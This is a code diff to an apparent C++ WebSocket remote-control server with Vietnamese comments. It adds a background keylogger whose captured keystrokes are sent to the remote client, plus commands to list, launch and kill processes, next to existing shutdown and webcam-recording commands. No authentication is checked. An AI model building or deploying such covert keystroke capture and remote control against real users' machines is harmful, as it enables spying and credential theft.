@@ -14,7 +14,8 @@
 #include <memory>
 #include <vector>
 
-#include "ProcessModule.h"
+#include "Process.h"
+#include "Keylogger.h"
 #include "Webcam.h"
 
 // Tu dong link thu vien socket cua Windows
@@ -139,6 +140,8 @@ public:
             std::string command = beast::buffers_to_string(buffer_.data());
 
             std::cout << "RECEIVED COMMAND: " << command << "\n";
+            static Keylogger myKeylogger;
+            static Process myProcessModule;
 
             // Xu ly lenh 
             // 1. Xu ly Shutdown
@@ -182,7 +185,71 @@ public:
                     ws_.write(net::buffer("Server: Error recording video."));
                 }
             }
-            // 4. Lenh khong xac dinh
+
+            // 4. Xu li Keylogger
+            else if (command == "start-keylog")
+            {
+                myKeylogger.StartKeyLogging();
+                ws_.text(true);
+                ws_.write(net::buffer("Server: Keylogger da bat dau (chay ngam)..."));
+            }
+            else if (command == "stop-keylog")
+            {
+                myKeylogger.StopKeyLogging();
+                ws_.text(true);
+                ws_.write(net::buffer("Server: Keylogger da dung lai."));
+            }
+            else if (command == "get-keylog")
+            {
+                // Lay du lieu phim da ghi duoc
+                std::string logs = myKeylogger.GetLoggedKeys();
+
+                if (logs.empty()) logs = "[Chua co phim nao duoc go]";
+
+                ws_.text(true);
+                // Gui du lieu ve Client
+                ws_.write(net::buffer("KEYLOG_DATA:\n" + logs));
+            }
+            // 5. Xu li Process
+             // Lenh "ps": Liet ke danh sach process
+            else if (command == "ps")
+            {
+                std::string list = myProcessModule.ListProcesses();
+                ws_.text(true);
+                // Gui danh sach ve cho Client
+                ws_.write(net::buffer(list));
+            }
+            // Lenh "start <ten app>": Mo chuong trinh
+            // Vi du: start notepad.exe
+            else if (command.rfind("start ", 0) == 0)
+            {
+                // Cat bo chu "start " (6 ky tu dau) de lay ten app
+                std::string appName = command.substr(6);
+
+                if (myProcessModule.StartProcess(appName)) {
+                    ws_.text(true);
+                    ws_.write(net::buffer("Server: Da mo thanh cong: " + appName));
+                }
+                else {
+                    ws_.text(true);
+                    ws_.write(net::buffer("Server: Loi! Khong the mo: " + appName));
+                }
+            }
+            // Lenh "kill <ten app hoac PID>": Tat chuong trinh
+            // Vi du: kill notepad.exe HOAC kill 1234
+            else if (command.rfind("kill ", 0) == 0)
+            {
+                // Cat bo chu "kill " (5 ky tu dau) de lay ten app/PID
+                std::string target = command.substr(5);
+
+                // Goi ham Stop va lay thong bao loi/thanh cong tra ve
+                std::string result = myProcessModule.StopProcess(target);
+
+                ws_.text(true);
+                ws_.write(net::buffer("Server: " + result));
+            }
+
+            // Lenh khong xac dinh
             else
             {
                 ws_.text(true);
